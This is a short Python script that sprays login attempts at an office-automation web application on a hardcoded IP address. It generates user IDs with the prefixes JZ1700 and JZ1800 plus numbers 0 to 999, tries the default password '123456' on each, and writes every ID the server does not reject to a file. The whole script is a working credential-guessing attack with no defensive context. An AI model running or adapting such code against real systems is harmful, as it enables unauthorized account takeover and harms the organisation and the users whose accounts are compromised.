import requests


def main(user):
    url = "http://118.89.140.109/OAapp/WebObjects/OAapp.woa/wo/com.oa8000.mainapp.Main/hL6GUBC1AmNv4X6DdJcPlw/0.11;jsessionid=26B06FB51DC281EF65657246D10D0F73"
    req = {
        "userId": user,
        "userPwd": "123456",
        "functionName": "LOGIN",
        "screenHeight": "728",
        "screenWidth": "1366"
    }
    resp = requests.post(url=url, data=req)
    if '输入用户不存在，或密码错误，请重新输入' not in resp.text:
        f = open("a.txt", mode="a", encoding="utf8")
        f.write(req.get('userId') + ',' + req.get('userPwd'))
        f.write("\n")
        f.close()
        print(req.get('userId'), req.get('userPwd'))


if __name__ == '__main__':
    for i in range(1000):
        main("JZ1700" + str(i))
        main("JZ1800" + str(i))
